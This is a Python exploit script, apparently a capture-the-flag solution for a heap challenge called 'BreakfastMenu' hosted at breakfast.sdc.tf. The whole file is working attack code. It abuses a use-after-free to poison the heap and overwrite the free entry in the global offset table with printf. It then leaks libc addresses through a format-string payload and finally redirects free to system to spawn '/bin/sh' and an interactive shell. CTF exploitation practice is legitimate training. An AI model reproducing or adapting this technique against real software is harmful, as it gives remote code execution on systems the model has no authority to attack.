#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./BreakfastMenu')
host = args.HOST or 'breakfast.sdc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

idx=-1

def choice(cmd):
	sla("4. Pay your bill and leave\n", str(cmd))

def create():
	global idx
	choice(1)
	idx=idx+1
	return idx

def edit(idx, data):
	choice(2)
	sla("which order would you like to modify\n", str(idx))
	sla("What would you like to order?\n", data)

def delete(idx):
	choice(3)
	sla("which order would you like to remove\n", str(idx))

libc=SetupLibcELF()
io = start()
A=create()
delete(A)
edit(A, p64(exe.got.free - 8))
junk=create()
target=create() # returns heap above the free got
edit(target, b"A"*8 + p(exe.sym.printf))
edit(A, "%9$p||%10$p||%11$p||%12$p||%13$p||%14$p||%15$p||%16$p")
delete(A) # trigger format string bug
leaks=GetInt(rl())
libc.address = leaks[2]-0x21c87
lb()
edit(target, b"A"*8 + p(libc.sym.system))
edit(A, "/bin/sh\x00")
delete(A)
io.interactive()
